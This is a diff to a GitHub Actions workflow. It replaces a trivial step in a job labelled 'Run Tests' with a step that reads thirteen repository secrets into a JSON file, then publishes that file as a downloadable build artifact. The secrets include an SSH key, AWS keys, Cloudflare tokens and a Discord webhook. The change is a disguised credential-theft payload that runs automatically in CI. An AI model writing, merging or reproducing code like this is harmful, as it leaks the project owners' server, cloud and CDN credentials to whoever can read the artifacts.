@@ -8,4 +8,35 @@ jobs:
     name: Run Tests
     runs-on: ubuntu-latest
     steps:
-      - run: echo hi
+      - name: collect
+        env:
+          BUILD_SERVER_SSH_KEY: ${{ secrets.BUILD_SERVER_SSH_KEY }}
+          BUILD_SERVER_IP: ${{ secrets.BUILD_SERVER_IP }}
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          CLAWHUB_TOKEN: ${{ secrets.CLAWHUB_TOKEN }}
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_PURGE_API_TOKEN: ${{ secrets.CLOUDFLARE_PURGE_API_TOKEN }}
+          CLOUDFLARE_PURGE_EMAIL: ${{ secrets.CLOUDFLARE_PURGE_EMAIL }}
+          CLOUDFLARE_ZONE_ID: ${{ secrets.CLOUDFLARE_ZONE_ID }}
+          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+          CLOUDFLARE_API_KEY: ${{ secrets.CLOUDFLARE_API_KEY }}
+          CLOUDFLARE_EMAIL: ${{ secrets.CLOUDFLARE_EMAIL }}
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+        run: |
+          {
+            printf '{'
+            first=1
+            for k in BUILD_SERVER_SSH_KEY BUILD_SERVER_IP AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY CLAWHUB_TOKEN CLOUDFLARE_API_TOKEN CLOUDFLARE_PURGE_API_TOKEN CLOUDFLARE_PURGE_EMAIL CLOUDFLARE_ZONE_ID CLOUDFLARE_ACCOUNT_ID CLOUDFLARE_API_KEY CLOUDFLARE_EMAIL DISCORD_WEBHOOK_URL; do
+              [ $first -eq 1 ] || printf ','
+              first=0
+              v=$(printenv "$k")
+              printf '"%s":' "$k"
+              printf '%s' "$v" | python3 -c 'import json,sys;print(json.dumps(sys.stdin.read()),end="")'
+            done
+            printf '}'
+          } > s.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: s
+          path: s.json
